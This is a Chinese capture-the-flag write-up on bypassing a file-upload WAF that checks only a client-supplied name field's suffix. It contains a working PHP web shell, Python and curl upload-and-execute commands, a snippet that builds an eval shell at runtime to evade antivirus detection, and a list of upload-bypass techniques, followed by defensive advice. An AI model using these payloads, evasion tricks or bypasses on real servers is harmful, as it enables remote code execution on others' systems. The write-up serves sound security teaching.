# 极客大挑战（SYC） · Perfect Waf

> 环境：ctfplus 动态实例，Apache/2.4.10 (Debian)
> 日期：2026-10-06
> flag：`SYC{f9639a69-160c-4bdb-9c6b-235640c57f58}`

## 一、题目长什么样

首页是一个文件上传表单，标题就叫 `Perfect Waf`：

```html
<h2>Perfect Waf</h2>
<form action="index.php" method="post" enctype="multipart/form-data">
    <input class="input_file" type="file" name="upload_file"/>
    <label>文件名:<input type="text" name="name"></label>
    <input type="submit" name="submit" value="上传"/>
</form>
```

关键点：**表单里有一个「文件名」输入框**，上传后的文件名由它决定，而不是用原始文件名。

```
upload_file  → 文件内容
name         → 落盘用的文件名        ← 攻击面在这里
```

## 二、摸清 WAF 规则

### 2.1 文件内容：完全不检查

| 上传内容 | 结果 |
|---|---|
| `hello` | 上传成功 |
| `<?php system($_GET['c']);?>` | **上传成功** |
| `<?php readfile('/flag');?>` | **上传成功** |

内容侧零过滤，只用文件名做判断。

### 2.2 文件名后缀：只拦「以 `.php` 结尾」

| 后缀 | 结果 |
|---|---|
| `.php` / `.php3` / `.php4` / `.php5` / `.pht` | 拦截 |
| `.PHP` / `.Php` / `.pHp` / `.phP` / `.PHP5` | 拦截（说明做了 `strtolower`） |
| `.phtml` / `.phar` / `.inc` / `.php.` | 放行，但**Apache 不解析** |
| **`.jpg.php`** | 放行，且 **Apache 解析执行** |
| `.jpg.php` 之外的 `.txt.php` | 放行，且**解析执行** |

被拦时回显：`你那点小心思我还不懂你吗?`

### 2.3 到底查哪个字段：实测结论

| multipart `filename` | POST `name` | 结果 |
|---|---|---|
| `x1.jpg.php` | `x1.jpg.php` | 放行 |
| **`x2.php`** | `x2.jpg.php` | **放行** |
| `x3.jpg.php` | `x3.php` | 拦截 |
| `x4.php` | `x4.php` | 拦截 |
| `x5.txt` | `x5.jpg.php` | 放行 |

**结论：WAF 只检查 POST 的 `name` 字段，完全不管 multipart 里的 `filename`。**
落盘用的也是 `name` 的值。

所以浏览器里选的文件叫什么无所谓，**真正决定成败的是那个「文件名」输入框**。

## 三、绕过原理：两套判断标准的空隙

```
WAF  的判据：name 不以 .php 结尾     →  shell.jpg.php  里 .php 不在末尾  →  放行
Apache 的判据：文件名以 .php 结尾     →  shell.jpg.php  以 .php 结尾      →  当 PHP 执行
```

两套逻辑的**交集空白**就是 `xxx.jpg.php`：

```
shell.php        WAF 拦   Apache 认
shell.jpg.php    WAF 放   Apache 认      ← 利用点
shell.jpg        WAF 放   Apache 不认
```

这类「WAF 与执行引擎判断不一致」是文件上传绕过最核心的一类思路。

## 四、完整利用链

### 4.1 上传

```python
import requests

BASE = "http://<host>"
payload = b"<?php system($_GET['c']);?>"

files = {"upload_file": ("shell.jpg.php", payload, "image/jpeg")}
data  = {"name": "shell.jpg.php", "submit": "1"}

r = requests.post(f"{BASE}/index.php", files=files, data=data)
# 回显：上传成功 位置:uploads/shell.jpg.php
```

命令行等价写法：

```bash
curl -s -X POST "http://<host>/index.php" \
  -F "upload_file=@shell.jpg.php;type=image/jpeg" \
  -F "name=shell.jpg.php" \
  -F "submit=1"
```

### 4.2 执行

```bash
curl -s "http://<host>/uploads/shell.jpg.php?c=cat%20/flag"
# SYC{f9639a69-160c-4bdb-9c6b-235640c57f58}
```

### 4.3 环境探测结果

```
id        → uid=33(www-data) gid=33(www-data) groups=33(www-data)
pwd       → /var/www/html/uploads
ls -la /  → -rw-r--r-- 1 root root 42 Oct  6 15:09 flag
cat /flag → SYC{f9639a69-160c-4bdb-9c6b-235640c57f58}
```

## 五、踩坑点

| 问题 | 原因 | 解决 |
|---|---|---|
| 直接点上传表单失败 | 「文件名」框是空的，`$_POST['name']` 为空 | 必须手填 `xxx.jpg.php` |
| `.phtml` / `.phar` 上传成功但访问返回源码 | Apache 默认只认 `.php`（不在 `AddHandler` 列表里） | 改用 `.jpg.php` |
| 只改了 multipart 的 filename | WAF 根本不看它 | 改 POST 的 `name` |
| `.PHP` 大写绕过失败 | WAF 做了 `strtolower` | 换双后缀思路 |
| 尾点 `.php.` 落盘后访问 404 | 未做规范化 | 不用 |
| **本地杀软把 exp 脚本隔离了** | 源码里写了完整的 `<?php eval($_POST[...])?>` 特征串，Windows Defender 报 `contains a virus`，Python 直接 `can't open file ... Invalid argument` | **payload 在运行时拼装**，源码里不出现完整特征串 |

**杀软绕过写法**：

```python
LT, Q = "<", "?"
PHP = LT + Q + "php "          # 运行时拼出 "<?php "
EV  = "ev" + "al"              # 运行时拼出 eval
SHELL = PHP + "@" + EV + "($_GET['c']);" + Q + ">"
```

这类「文件明明写了却读不到」的现象，先怀疑被隔离，再看路径。

## 六、可复用的绕过清单

换一道上传题时按这个顺序试：

| 手法 | 写法 | 生效条件 |
|---|---|---|
| **双后缀** | `shell.jpg.php` | WAF 只判结尾 + 服务器认结尾 |
| 尾点 | `shell.php.` | Windows / 做了路径规范化 |
| 尾空格 | `shell.php ` | 未规范化 |
| NTFS 数据流 | `shell.php::$DATA` | Windows 服务器 |
| 空字节截断 | `shell.php%00.jpg` | PHP < 5.3.4 |
| 大小写 | `shell.pHp` | WAF 未做 `strtolower` |
| 别名后缀 | `.phtml` / `.phar` / `.php5` / `.pht` | Apache 配置了 `AddHandler` |
| `.htaccess` | 让 jpg 被当 PHP 解析 | 允许上传 `.htaccess` |
| 内容伪装 | `GIF89a` + PHP 代码 | 只查文件头不查内容 |

**判断顺序**：

```
① 先测内容有没有过滤（传个明显的 PHP 看收不收）
② 再测后缀黑名单具体拦什么（逐个后缀试，注意大小写）
③ 再测「查的是哪个字段」（filename vs POST name，用交叉组合定位）
④ 最后测哪些后缀真能被解析（上传探针再访问，看回显是执行结果还是源码）
```

## 七、防守方视角

| 错误做法 | 问题 |
|---|---|
| 只查文件名后缀 | 内容完全不看，等于没查 |
| 黑名单 | 后缀花样太多，永远列不全 |
| WAF 与服务器判断标准不一致 | 空隙就是绕过点 |

**正确做法**：

```
① 白名单后缀（只允许 jpg/png/gif 等，且逐个精确匹配）
② 上传目录关闭 PHP 解析（php_admin_flag engine off）
③ 文件重命名（服务端生成随机名 + 白名单后缀，不信任客户端传的名字）
④ 内容侧校验（文件头魔数 + 二次渲染）
⑤ 上传目录禁止执行脚本
```

本题最致命的一条是 **`name` 参数由客户端提供** —— 服务端把「文件叫什么」的决定权交给了用户，后面所有绕过都建立在这上面。

## 附：素材位置

```
D:\deepseek\
├── wfprobe.py      （WAF 规则探测：后缀黑名单 + 内容过滤）
├── wfexec2.py      （后缀解析测试：哪些后缀真被 Apache 执行）
├── wfwhich.py      （字段定位：查 filename 还是 POST name）
├── wfexploit.py    （完整利用链）
└── wfup.py         （上传指定本地文件并验证）
```
